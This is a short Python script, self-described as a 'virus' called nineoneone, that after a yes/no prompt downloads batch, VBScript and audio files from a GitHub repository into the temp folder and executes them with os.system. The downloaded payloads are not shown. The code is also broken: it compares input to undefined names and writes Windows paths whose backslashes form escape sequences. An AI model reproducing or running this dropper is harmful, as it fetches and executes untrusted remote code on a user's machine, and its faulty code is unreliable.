#  __  _  _  __  _  ____  ____  __  _  ____  ____  __  _  ____ 
# |  \| || ||  \| || ===|/ () \|  \| || ===|/ () \|  \| || ===|
# |_|\__||_||_|\__||____|\____/|_|\__||____|\____/|_|\__||____|

import os
from urllib.request import *
import time

url1 = "https://raw.githubusercontent.com/sgysh3nka/nineoneone/refs/heads/main/nineoneone2.bat"
url2 = "https://raw.githubusercontent.com/sgysh3nka/nineoneone/refs/heads/main/nineoneone.vbs"
url3 = "https://raw.githubusercontent.com/sgysh3nka/nineoneone/refs/heads/main/nineoneone.bat"
url4 = "https://github.com/sgysh3nka/nineoneone/raw/refs/heads/main/911.mp3"

print("Welcome to nineoneone")
quest1 = input('Do you wanna run this virus? [yes/no] ')
if quest1 == yes:
    urllib.request.urlretrieve(url1, '%TMP%\nineoneone\nineoneone2.bat')
    print("1/4")
    time.sleep(5)
    urllib.request.urlretrieve(url2, '%TMP%\nineoneone\nineoneone.vbs')
    print("2/4")
    time.sleep(5)
    urllib.request.urlretrieve(url3, '%TMP%\nineoneone\nineoneone.bat')
    print("3/4")
    time.sleep(5)
    urllib.request.urlretrieve(url4, '%TMP%\nineoneone\911.mp3')
    print("4/4")
    os.system("%TMP%\nineoneone\nineoneone2.bat")
    print("Running.")
    os.system("%TMP%\nineoneone\nineoneone.vbs")
    print("Running..")
    os.system("%TMP%\nineoneone\nineoneone.bat")
    print("Running...")
elif quest1 == no:
    print("Bye, bye!")
    input('Press enter to exit.')
